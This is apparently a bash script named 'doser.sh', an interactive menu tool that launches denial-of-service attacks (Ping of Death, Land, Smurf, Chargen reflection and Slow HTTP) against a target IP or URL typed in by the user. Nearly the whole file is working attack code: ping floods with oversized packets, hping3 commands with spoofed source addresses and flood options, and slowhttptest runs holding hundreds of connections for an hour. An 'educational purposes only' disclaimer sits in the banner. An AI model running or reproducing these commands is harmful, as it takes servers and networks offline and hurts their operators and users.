#!/bin/bash

number_option=""
help_option=false

print_help() {
    echo "This is a script that demonstrates menus and submenus."
    echo "Usage: ./script.sh [OPTIONS]"
    echo "Options:"
    echo "  -p        Print help about Ping of Death Attack."
    echo "  -l        Print help about Land Attack."
    echo "  -s        Print help about Smurf Attack."
    echo "  -c        Print help about Chargen Attack."
    echo "  -sl       Print help about Slow HTTP Attack."
    echo "  --help    Print this help message and exit."
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -p)
            number_option="-p"
            ;;
        -l)
            number_option="-l"
            ;;
        -s)
            number_option="-s"
            ;;
        -c)
            number_option="-c"
            ;;
        -sl)
            number_option="-sl"
            ;;
        --help | -h)
            help_option=true
            ;;
        *)
            echo "Invalid option: $1"
            exit 1
            ;;
    esac
    shift
done

if $help_option; then
    print_help
fi

if [ -n "$number_option" ]; then
    case $number_option in
        -p)
            echo "Ping of Death continiously sends packets of ICMP (65535 bytes of data) until targets gets in a DoS condition."
            echo "If attack is not working then the target probably uses protection against PoD attack."
            ;;
        -l)
            echo "Land Attack spoofs target ip and sends tcp to itself, stucking in a time loop and leading to Dos."
            echo "Not really effective, I will try to improve it in upcoming updates."
            ;;
        -s)
            echo "Smurf Attack spoofs target ip and sends multiple icmp packets to broadcast address."
            echo "Then broadcast address sends the icmp request to all machines in the network."
            echo "Then all these machines respond to spoofed ip making a DDoS."
            ;;
        -c)
            echo "Chargen Attack (character generator) spoofs ip of target and send TCP/UDP packets to a reflective server on the port 19 (Chargen)."
            echo "The reflective server receives TCP/UDP requests and send an amplified response back to target in result of flooding the target's machine."
            ;;
        -sl)
            echo "Slow HTTP Attack once connected to target server, sends partial HTTP requests to server leading to DoS."
            ;;
        *)
            ;;
    esac
    exit 0
fi

clear

create_subdirectory() {
    local dirname="$1"
    if [ ! -d "$dirname" ]; then
        mkdir "$dirname"
        echo "Created subdirectory: $dirname"
    else
        echo "Subdirectory already exists: $dirname"
    fi
}

echo -e "\e[32m
██▄   ████▄    ▄▄▄▄▄   ▄███▄   █▄▄▄▄ 
█  █  █   █   █     ▀▄ █▀   ▀  █  ▄▀ 
█   █ █   █ ▄  ▀▀▀▀▄   ██▄▄    █▀▀▌  
█  █  ▀████  ▀▄▄▄▄▀    █▄   ▄▀ █  █  
███▀                   ▀███▀     █   
                                ▀ 
       
     ####DISCLAIMER####
Only Use For Educational Purposes!
In Any Case The Creator Of the Tool Is Not Responsible!  

Usage: ./doser.sh --help or -h    
\e[0m"

echo -e "\e[${color}m${text}\e[0m"
echo -e "                                  By Nick Siachos"

options=("Ping Of Death" "Land Attack" "Smurf Attack" "Chargen Attack" "Slow HTTP Attack" "EXIT")

print_colored_text() {
    local text="$1"
    local color="$2"
    echo -e "\e[${color}m${text}\e[0m"
}

while true; do
    PS3="Please select an option: "
    echo

    for ((i=0; i<${#options[@]}; i++)); do
        print_colored_text "$((i+1)). ${options[i]}" "34;1"  
        echo 
    done

    echo
    read -rp "Select An Attack Method: " main_choice

    case $main_choice in
        1)
            echo "You selected Ping Of Death"
            submenu=("Default attack (65000 packets|0.0001 seconds)" "Custom Attack (Choose options)" "Back to Main Menu")
            while true; do
                PS3="Please select a suboption: "
                echo

                for ((i=0; i<${#submenu[@]}; i++)); do
                    print_colored_text "$((i+1)). ${submenu[i]}" "34;1" 
                    echo  
                done

                echo
                read -rp "Enter the number of your suboption: " sub_choice

                case $sub_choice in
                    1)
                        echo "You selected Default Attack"
                        read -rp "Enter Target IP: " target_ip
                        echo "Pinging To Death $target_ip"
                        ping $target_ip -s 65000 -i 0.0001
                        ;;
                    2)
                        echo "You selected Custom Attack"
                        read -rp "Enter Target IP: " target_ip
                        read -rp "Enter a number of packets to send (max 65000 packets): " pack_num
                        read -rp "Send packets every x seconds (enter x): " num_ofpack
                        echo "Pinging To Death $target_ip with $pack_num packets every $num_ofpack seconds"
                        ping $target_ip -s $pack_num -i $num_ofpack 
                        ;;
                    3)
                        break  
                        ;;
                    *)
                        echo "Invalid suboption, please select a valid suboption."
                        ;;
                esac
            done
            ;;
        2)
            echo "You selected Land Attack"
            submenu=("Default attack (1 packet)" "Back to Main Menu")
            while true; do
                PS3="Please select a suboption: "
                echo

                for ((i=0; i<${#submenu[@]}; i++)); do
                    print_colored_text "$((i+1)). ${submenu[i]}" "34;1" 
                    echo  
                done

                echo
                read -rp "Enter the number of your suboption: " sub_choice

                case $sub_choice in
                    1)
                        echo "You selected Default attack"
                        read -rp "Enter Target IP: " target2_ip
                        read -rp "Enter Target PORT: " target_port
                        echo "Land Attacking $target2_ip:$target_port"
                        for i in {1..1000};
                        do 
                            hping3 $target2_ip -a $target2_ip -p $target_port -s $target_port -S -c 1
                        done
                        ;;
                    2)
                        break 
                        ;;
                    *)
                        echo "Invalid suboption, please select a valid suboption."
                        ;;
                esac
            done
            ;;
        3)
            echo "You selected Smurf Attack"
            submenu=("Default attack" "Back to Main Menu")
            while true; do
                PS3="Please select a suboption: "
                echo


                for ((i=0; i<${#submenu[@]}; i++)); do
                    print_colored_text "$((i+1)). ${submenu[i]}" "34;1"  
                    echo  
                done

                echo
                read -rp "Enter the number of your suboption: " sub_choice

                case $sub_choice in
                    1)
                        echo "You selected Default attack"
                        read -rp "Enter Target Broadcast IP: " target_broadip
                        read -rp "Enter Target IP: " target3_ip
                        echo "Smurf Attacking $target3_ip"
                        hping3 $target_broadip -a $target3_ip --icmp -C 8 -D -i u100
                        ;;
                    2)
                        break  
                        ;;
                    *)
                        echo "Invalid suboption, please select a valid suboption."
                        ;;
                esac
            done
            ;;
        4)
            echo "You selected Chargen Attack"
            submenu=("Default attack" "Back to Main Menu")
            while true; do
                PS3="Please select a suboption: "
                echo

                for ((i=0; i<${#submenu[@]}; i++)); do
                    print_colored_text "$((i+1)). ${submenu[i]}" "34;1"  
                    echo  
                done

                echo
                read -rp "Enter the number of your suboption: " sub_choice

                case $sub_choice in
                    1)
                        echo "You selected Default attack"
                        read -rp "Enter Chargen Service: " char_ser
                        read -rp "Enter Target IP: " target4_ip
                        echo "Chargen Attacking $target4_ip"
                        hping3 $char_ser -a $target4_ip -p 19 --udp -D --flood
                        ;;
                    2)
                        break  
                        ;;
                    *)
                        echo "Invalid suboption, please select a valid suboption."
                        ;;
                esac
            done
            ;;
        5)
            echo "You selected Slow HTTP Attack"
            submenu=("Default Attack (500 connections, 30 connections per second, 20 seconds wating for response, 3600 seconds attacking duration" "Custom Attack" "slowhttptest help" "Back to Main Menu")
            while true; do
                PS3="Please select a suboption: "
                echo

                for ((i=0; i<${#submenu[@]}; i++)); do
                    print_colored_text "$((i+1)). ${submenu[i]}" "34;1"  
                    echo  
                done

                echo
                read -rp "Enter the number of your suboption: " sub_choice

                case $sub_choice in
                    1)
                        echo "You selected Default Attack"
                        read -rp "Enter Target URL: " target_url
                        echo "Slowhttp attacking $target_url"
                        slowhttptest -H -u $target_url -t GET -c 500 -r 30 -p 20 -l 3600
                        ;;
                    2)
                        echo "You selected Custom Attack"
                        read -rp "Enter Target URL: " target_url
                        read -rp "Enter Connections: " con
                        read -rp "Enter Connections Per Second: " cps
                        read -rp "Enter Response Waiting Seconds: " rws
                        read -rp "Enter Attack Duration: " ad
                        echo "Slowhttp attacking $target_url"
                        slowhttptest -H -u $target_url -t GET -c $con -r $cps -p $rws -l $ad
                        ;;
                    3) 
                        slowhttptest -h
                        ;;
                    4)
                        break  
                        ;;
                                         
                    *)
                        echo "Invalid suboption, please select a valid suboption."
                        ;;
                esac
            done
            ;;
        6)
            echo "Goodbye!"
            exit 0
            ;;
        *)
            echo "Invalid option, please select a valid number."
            ;;
    esac
done
